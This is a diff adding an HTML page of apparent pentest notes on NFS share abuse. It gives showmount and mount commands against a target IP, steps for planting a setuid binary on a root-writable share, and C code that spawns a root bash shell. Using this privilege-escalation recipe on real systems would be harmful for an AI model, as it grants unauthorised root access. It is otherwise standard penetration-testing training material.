@@ -1,0 +1,30 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>NFS Shares</title>
+</head><body># First check if the target machine has any NFS shares<br/>
+showmount -e 192.168.1.101<br/>
+<br/>
+# If it does, then mount it to you filesystem<br/>
+mount 192.168.1.101:/ /tmp/<br/>
+<br/>
+If that succeeds then you can go to /tmp/share. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.<br/>
+<br/>
+If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.<br/>
+<br/>
+This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:<br/>
+<br/>
+chmod 4777 exploit<br/>
+<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;stdlib.h&gt;<br/>
+#include &lt;sys/types.h&gt;<br/>
+#include &lt;unistd.h&gt;<br/>
+<br/>
+int main()<br/>
+{<br/>
+&nbsp; &nbsp; setuid(0);<br/>
+&nbsp; &nbsp; system("/bin/bash");<br/>
+&nbsp; &nbsp; return 0;<br/>
+}</body></html>
